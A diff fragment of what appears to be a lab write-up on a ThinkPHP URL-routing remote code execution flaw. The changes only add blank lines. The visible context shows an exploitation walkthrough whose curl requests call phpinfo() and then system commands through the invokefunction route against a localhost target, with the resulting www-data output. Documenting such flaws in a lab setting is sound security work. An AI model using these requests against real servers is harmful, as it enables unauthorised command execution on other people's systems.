@@ -16,6 +16,7 @@ The vulnerability stems from ThinkPHP's URL routing parser. If the application d
 ## Exploitation Walkthrough
 
 ### 1. Verification of Vulnerability via Curl
+
 Send a GET request calling `phpinfo()` via dynamic controller invocation:
 
 ```bash
@@ -25,6 +26,7 @@ curl -s 'http://localhost:8131/index.php?s=/Index/\think\app/invokefunction&func
 The response outputs the complete PHP configuration table.
 
 ### 2. Executing Arbitrary System Commands
+
 Invoke `system` or `passthru` to execute shell commands:
 
 ```bash
@@ -32,6 +34,7 @@ curl -s 'http://localhost:8131/index.php?s=/Index/\think\app/invokefunction&func
 ```
 
 Output:
+
 ```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
